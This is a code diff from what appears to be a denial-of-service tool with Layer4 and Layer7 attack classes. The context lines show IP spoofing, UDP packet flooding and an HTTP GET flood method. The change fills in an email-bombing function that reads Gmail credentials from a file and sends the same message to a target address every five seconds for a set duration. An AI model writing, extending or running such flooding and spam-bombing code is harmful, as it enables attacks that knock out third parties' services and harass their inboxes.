@@ -5,8 +5,10 @@ import json
 import threading
 import random
 import socket
-from globals import ICMP_PACKET_AMOUNT, SOCKET_COUNT
+import utils
+from globals import GMAIL_ACCOUNT_FILE, ICMP_PACKET_AMOUNT, SOCKET_COUNT
 from log import log
+from emailsender import MailSender
 
 def Spoof_IP():
     return RandIP()
@@ -44,9 +46,16 @@ class Layer4:
             send(IP_Packet/UDP_Packet/payload, verbose=0)
             
     @staticmethod
-    def EMAIL_Spam(target: str, time: int):
-        pass
-
+    def EMAIL_Spam(target: str, time: int, message: str):
+        account, password = utils.get_gmail_account_from_file(GMAIL_ACCOUNT_FILE)
+        mail_sender = MailSender(account, password)
+        mail_sender.connect()
+        end_t = timing.time() + time
+        while(timing.time() < end_t):
+            mail_sender.send_mail(target, message)
+            timing.sleep(5)
+        mail_sender.disconnect()
+        
 class Layer7:
     @staticmethod
     def HTTP_GET_Flood(target: str, time: int):
